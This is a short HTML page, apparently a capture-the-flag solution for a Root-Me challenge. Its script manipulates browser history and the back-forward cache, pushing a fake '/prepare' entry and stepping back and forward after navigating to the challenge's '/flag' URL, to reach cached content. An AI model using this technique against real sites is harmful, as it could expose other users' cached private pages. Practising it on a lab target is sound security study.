<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <script>
    let visitedFlag = false;
    
    window.addEventListener('load', () => {

      history.pushState({}, '', '/prepare');
      
      // Timing parfait
      setTimeout(() => {
        visitedFlag = true;
        location.href = 'http://challenge01.root-me.org:58007/flag';
      }, 500);
    });

    window.addEventListener('pageshow', (event) => {
      if (visitedFlag && event.persisted) {

        console.log('BFCACHE HIT!');
        return;
      }
      
      if (visitedFlag) {

        setTimeout(() => {
          history.back();  
        }, 800);
        
        setTimeout(() => {
          history.forward();  
        }, 1200);
      }
    });
  </script>
</head>
<body style="background:black;color:lime;font-size:30px;">
  <h1>BACK-FORWARD TRICK</h1>
</body>
</html>
